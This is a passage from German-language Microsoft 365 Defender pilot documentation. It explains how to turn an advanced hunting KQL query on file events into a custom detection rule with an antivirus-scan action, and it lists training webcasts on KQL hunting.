    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Erstellen einer Erkennung

Nachdem Sie eine Abfrage erstellt haben, die  Informationen identifiziert, über die Sie informiert werden möchten, wenn sie in Zukunft auftreten, können Sie eine benutzerdefinierte Erkennung aus der Abfrage erstellen.

Benutzerdefinierte Erkennungen führen die Abfrage entsprechend der von Ihnen festgelegten Häufigkeit aus, und die Ergebnisse der Abfragen erstellen Sicherheitswarnungen, basierend auf den von Ihnen verwendeten ressourcenbezogenen Auswirkungen. Diese Warnungen werden mit Vorfällen korreliert und können als alle anderen Sicherheitswarnungen, die von einem der Produkte generiert werden, triaged werden.

1. Entfernen Sie auf der Abfrageseite die Zeilen 7 und 8, die in Schritt 7 der Anweisungen zum Ausführen der Suche hinzugefügt wurden, und klicken Sie auf **Erkennungsregel erstellen.**

   ![Screenshot der Stelle, an der Sie auf der Seite erweiterte Suche auf Erkennungsregel erstellen klicken können](../../media/mtp/fig22.png)

   > [!NOTE]
   > Wenn Sie auf **Erkennungsregel erstellen** klicken und syntaxfehler in der Abfrage enthalten sind, wird Ihre Erkennungsregel nicht gespeichert. Überprüfen Sie ihre Abfrage, um sicherzustellen, dass keine Fehler auftreten.

2. Füllen Sie die erforderlichen Felder mit den Informationen aus, die es dem Sicherheitsteam ermöglichen, die Warnung zu verstehen, warum sie generiert wurde und welche Aktionen sie ausführen sollen.

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Warnungsdetails definieren können](../../media/mtp/fig23.png)

   Stellen Sie sicher, dass Sie die Felder mit Klarheit ausfüllen, um dem nächsten Benutzer eine fundierte Entscheidung über diese Erkennungsregelwarnung zu geben.

3. Wählen Sie aus, welche Entitäten in dieser Warnung betroffen sind. Wählen Sie in diesem Fall **Geräte** und **Postfach aus.**

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Parameter der betroffen Entitäten auswählen können](../../media/mtp/fig24.png)

4. Bestimmen Sie, welche Aktionen beim Auslösen der Warnung stattfinden sollen. Führen Sie in diesem Fall einen Antivirenscan aus, obwohl andere Aktionen ausgeführt werden können.

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie eine Antivirenscan ausführen können, wenn eine Warnung ausgelöst wird, um Bedrohungen zu begegnen](../../media/mtp/fig25.png)

5. Wählen Sie den Bereich für die Warnungsregel aus. Da es sich bei dieser Abfrage um Geräte handelt, sind die Gerätegruppen für diese benutzerdefinierte Erkennung entsprechend dem Microsoft Defender for Endpoint-Kontext relevant. Beim Erstellen einer benutzerdefinierten Erkennung, die geräte nicht als betroffene Entitäten enthält, gilt der Bereich nicht.

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie den Bereich für die Warnungsregel festlegen können, verwaltet Ihre Erwartungen an die Angezeigten Ergebnisse.](../../media/mtp/fig26.png)

   Für dieses Pilotprojekt möchten Sie diese Regel möglicherweise auf eine Teilmenge von Testgeräten in Ihrer Produktionsumgebung beschränken.

6. Wählen Sie **Erstellen** aus. Wählen Sie dann im **Navigationsbereich** benutzerdefinierte Erkennungsregeln aus.

   ![Screenshot der Option benutzerdefinierte Erkennungsregeln im Menü](../../media/mtp/fig27a.png)

   ![Screenshot der Seite "Erkennungsregeln", auf der die Regel- und Ausführungsdetails angezeigt werden](../../media/mtp/fig27b.png)

   Auf dieser Seite können Sie die Erkennungsregel auswählen, die eine Detailseite öffnet.

   ![Screenshot der Seite "E-Mail-Anlagen", auf der Sie den Status der Regelausführung, ausgelöste Warnungen und Aktionen, die Erkennung bearbeiten und so weiter sehen können](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Zusätzliche fortgeschrittene Übungen zum Durchgehen der Suche

Um mehr über die erweiterte Suche zu erfahren, werden Sie in den folgenden Webcasts durch die Funktionen der erweiterten Suche in Microsoft 365 Defender zum Erstellen säulenübergreifender Abfragen, zum Pivotieren von Entitäten und zum Erstellen von benutzerdefinierten Erkennungs- und Korrekturaktionen.

> [!NOTE]
> Bereiten Sie sich mit Ihrem eigenen GitHub-Konto vor, um die Suchabfragen in Ihrer Pilottestumgebung ausführen zu können.

|Titel|Beschreibung|MP4 herunterladen|Auf YouTube ansehen|Zu verwendende CSL-Datei|
|---|---|---|---|---|
|Episode 1: KQL-Grundlagen|Wir werden die Grundlagen der erweiterten Funktionen für die Suche in Microsoft 365 Defender abdecken. Erfahren Sie mehr über verfügbare erweiterte Suchesdaten und grundlegende KQL-Syntax und Operatoren.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Folge 1: CSL-Datei in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Folge 2: Beitritte|Wir lernen weiterhin informationen zu Daten in der erweiterten Suche und zum Verbinden von Tabellen. Erfahren Sie mehr über innere, äußere, eindeutige und semi-Verknüpfungen sowie die Nuancen der standardmäßigen Kusto-innerunique-Verknüpfung.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Folge 2: CSL-Datei in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Folge 3: Zusammenfassen, Pivotieren und Visualisieren von Daten|Jetzt, da wir Daten filtern, bearbeiten und verbinden können, ist es an der Zeit, mit der Zusammenfassung, Quantifizierung, dem Pivotieren und der Visualisierung zu beginnen. In dieser Folge werden der Zusammenfassungsoperator und einige der Berechnungen, die Sie beim Eintauchen in zusätzliche Tabellen im schema der erweiterten Suche ausführen können, dargestellt. Wir verwandeln unsere Datasets in Diagramme, mit deren Hilfe die Analyse verbessert werden kann.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Folge 3: CSL-Datei in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Folge 4: Let's hunt! Anwenden von KQL auf die Vorfallverfolgung|Zeit zum Nachverfolgen einiger Angreiferaktivitäten! In dieser Folge verwenden wir unser verbessertes Verständnis von KQL und der erweiterten Suche in Microsoft 365 Defender, um einen Angriff nachverfolgt zu haben. Erfahren Sie mehr über die Tipps und Tricks, die in diesem Feld zum Nachverfolgen von Aktivitäten von Angreifern verwendet werden, einschließlich der ABCs für Cybersicherheit und deren Anwendung auf Die Reaktion auf Vorfälle.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Episode 4: CSL-Datei in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Nächster Schritt

|![Abschluss- und Zusammenfassungsphase](../../media/mtp/close.png) <br>[Abschluss- und Zusammenfassungsphase](m365d-pilot-close.md)|Analysieren Sie Ihr Microsoft 365 Defender-Pilotergebnis, stellen Sie sie Ihren Beteiligten vor, und führen Sie den nächsten Schritt aus.
|:-----|:-----|
